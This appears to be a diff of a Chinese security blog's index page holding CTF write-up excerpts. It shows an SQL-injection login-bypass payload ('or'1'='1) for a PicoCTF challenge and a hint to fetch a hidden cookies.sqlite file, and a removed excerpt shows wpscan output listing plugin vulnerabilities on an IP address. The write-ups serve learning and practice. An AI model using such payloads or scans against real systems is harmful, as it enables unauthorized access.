-          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="My-First-SQL"><a href="#My-First-SQL" class="headerlink" title="My First SQL"></a>My First SQL</h3><p>网页是一个登录界面，尝试万能密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">admin</div><div class="line">&apos;or&apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></p>
+          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="My-First-SQL"><a href="#My-First-SQL" class="headerlink" title="My First SQL"></a>My First SQL</h3><p>网页是一个登录界面，尝试万能密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&apos;or&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
 <p>成功登陆。</p>
 <p>分析sql查询语句如下<br><code>select * from users where user = &#39;admin&#39; and pass = &#39;&#39;or&#39;1&#39;=&#39;1&#39;;</code><br>
           <!--noindex-->
@@ -1440,149 +1592,12 @@
       
         
           <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Biscuit"><a href="#Biscuit" class="headerlink" title="Biscuit"></a>Biscuit</h3><p>打开题目，显示<code>Access Denied</code>，还有姜饼人的背景。</p>
-<p>查看源代码，其中有注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!-- Storing stuff in the same directory as your web server doesn&apos;t seem like a good idea --&gt;</div><div class="line">&lt;!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file --&gt;</div></pre></td></tr></table></figure></p>
+<p>查看源代码，其中有注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Storing stuff in the same directory as your web server doesn&apos;t seem like a good idea --&gt;</span><br><span class="line">&lt;!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file --&gt;</span><br></pre></td></tr></table></figure></p>
 <p>提示我们去访问/private/cookies.sqlite文件。</p>
 <p>下载到了cookies.sqlite，sqlite是一种轻型的数据库，要用sqlite3去打开他。<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/09/18/PicoCTF-level3-WriteUp/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/Wordpress插件渗透测试/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/18/Wordpress插件渗透测试/" itemprop="url">
-                  Wordpress插件渗透测试
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/18/Wordpress插件渗透测试/" class="leancloud_visitors" data-flag-title="Wordpress插件渗透测试">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>网址是一个wordpress博客。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Apache/2.4.10 (Debian)</div></pre></td></tr></table></figure></p>
-<p>既然是wp，直接用wpscan扫一扫。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[+] We found 2 plugins:</div><div class="line"></div><div class="line">[+] Name: akismet</div><div class="line"> |  Latest version: 3.3.4</div><div class="line"> |  Location: http://218.2.197.234:2040/wp-content/plugins/akismet/</div><div class="line"></div><div class="line">[!] We could not determine a version so all vulnerabilities are printed out</div><div class="line"></div><div class="line">[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</div><div class="line">    Reference: https://wpvulndb.com/vulnerabilities/8215</div><div class="line">    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/</div><div class="line">    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html</div><div class="line">[i] Fixed in: 3.1.5</div><div class="line"></div><div class="line">[+] Name: wp-symposium - v15.1</div><div class="line"> |  Location: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/</div><div class="line"> |  Readme: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/readme.txt</div><div class="line">[!] The version is out of date, the latest version is 15.8.1</div></pre></td></tr></table></figure></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/18/Wordpress插件渗透测试/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1668,7 +1683,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-count">26</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
